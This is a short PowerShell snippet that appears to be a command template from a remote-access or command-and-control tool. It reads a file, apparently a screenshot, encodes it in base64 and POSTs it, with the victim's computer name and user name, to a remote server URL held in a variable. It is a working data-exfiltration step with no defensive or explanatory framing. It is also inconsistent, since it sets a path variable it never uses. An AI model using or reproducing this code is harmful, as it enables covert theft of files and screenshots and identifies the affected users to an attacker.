$filePath = "{{path}}"
$u = ($url + "file")
$base64Image = [convert]::ToBase64String((([System.IO.File]::ReadAllBytes($screenshotPath))))
Invoke-WebRequest -uri $u -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "filename"=$screenshotPath; "file"=$base64Image} | ConvertTo-Json) -ContentType "application/json"
echo done;